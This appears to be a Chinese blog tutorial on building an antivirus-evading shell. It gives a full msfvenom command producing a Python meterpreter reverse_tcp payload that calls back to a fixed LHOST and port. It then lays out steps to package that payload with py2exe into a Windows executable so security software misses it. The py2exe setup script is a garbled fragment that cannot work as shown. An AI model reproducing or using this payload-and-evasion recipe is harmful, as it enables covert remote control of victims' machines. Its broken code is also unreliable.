> 免杀一直以来是一个永恒的话题。我们生成的shell无时无刻要和安全软件进行较量。之所以知己知彼，百战不殆。本文我们将利用Python来生成免杀的shell。

### 🌈生成python版本的shell

代码如下：

```

msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.50.123 LPORT=5555 -f raw -o bbskali.py
```

![](../Images/6920fbce7c7641df2eda71cd60320f88.png)

生成python的脚本

### 🍢配置PY2EXE

*   (1)安装Python 2.7 x86 windows版：

**下载地址**：https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi 注意:必须使用`x86`版本`Python 2.7`。即使Windows是x64的，也要安装32位版本。

*   (2)安装32位Py2exe for python 2.7:

**下载地址**：https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download

### 🍝配置python脚本

```
#! /usr/bin/env python
#encoding:utf-8

"shell"
,"Python-based App"
,"1.0"
,"bbskali.py"], #第一步生成的shell的名字
"py2exe":{"bundle_files":1,"packages":"ctypes","includes":"base64,sys,socket,struct,time,code,platform,getpass,shutil"

,}},
```

将上面文件保存为`dabiaoge.py`然后执行下面命令

```

python ./dabiaoge.py py2exe
```
